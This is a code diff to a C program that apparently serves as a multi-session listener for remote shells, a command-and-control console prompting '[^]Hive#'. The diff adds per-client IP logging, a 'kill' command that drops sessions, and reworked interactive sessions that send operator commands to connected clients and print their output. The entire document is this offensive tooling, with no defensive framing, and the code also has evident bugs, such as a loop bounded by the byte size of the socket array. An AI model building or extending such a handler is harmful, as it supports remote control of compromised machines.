@@ -41,7 +41,7 @@ void *server(void *p) {
     
     client_sockets[counter] = client_socket;
     counter++;
-    printf("Connected\n");
+    printf("\nConnected [%s:%u].\n", inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));
 
     // while (1) {
     //     jump:
@@ -71,6 +71,7 @@ int main() {
     char reponse[16836];
 
     while (1) {
+        start:
         bzero(&user_input_buffer, sizeof(user_input_buffer));
         bzero(&port_command, sizeof(port_command));
         printf("[^]Hive#: ");
@@ -83,6 +84,7 @@ int main() {
             getSubString(user_input_buffer, port_command, 5, 15);
             if (strncmp("conns", port_command, 5) == 0) {
                 for (int i = 0; i < sizeof(client_sockets); i++) {
+                    bzero(&client, sizeof(client));
                     getsockname(client_sockets[i], (struct sockaddr *) &client, &client_size);
                     if (client_sockets[i] != 0){
                         printf("%d - [%s:%u]\n", i, inet_ntoa(client.sin_addr), ntohs(client.sin_port));
@@ -90,19 +92,27 @@ int main() {
                 }
             }
         }
+        else if (strncmp("kill ", user_input_buffer, 5) == 0) {
+            getSubString(user_input_buffer, port_command, 5, 15);
+            session_choice = atoi(port_command);
+            close(client_sockets[session_choice]);
+            client_sockets[session_choice] = 0;
+        }
         else if (strncmp("i ", user_input_buffer, 2) == 0) {
             getSubString(user_input_buffer, port_command, 2, 15);
             session_choice = atoi(port_command);
+            bzero(&client, sizeof(client));
+            getsockname(client_sockets[session_choice], (struct sockaddr *) &client, &client_size);
             while (1){
                 bzero(&buffer, sizeof(buffer));
                 bzero(&reponse, sizeof(reponse));
                 printf("[^]Shell#[%s:%u]: ", inet_ntoa(client.sin_addr), ntohs(client.sin_port));
                 fgets(buffer, sizeof(buffer), stdin);
-                strtok(buffer, "\n"); //Remove new-line chars.
-                write(client_sockets[session_choice], buffer, sizeof(buffer));
                 if (strncmp("q", buffer, 1) == 0) {
-                    break;
+                    goto start;
                 } else {
+                    strtok(buffer, "\n"); //Remove new-line chars.
+                    write(client_sockets[session_choice], buffer, sizeof(buffer));
                     recv(client_sockets[session_choice], reponse, sizeof(reponse), MSG_WAITALL);
                     printf("%s", reponse);
                 }
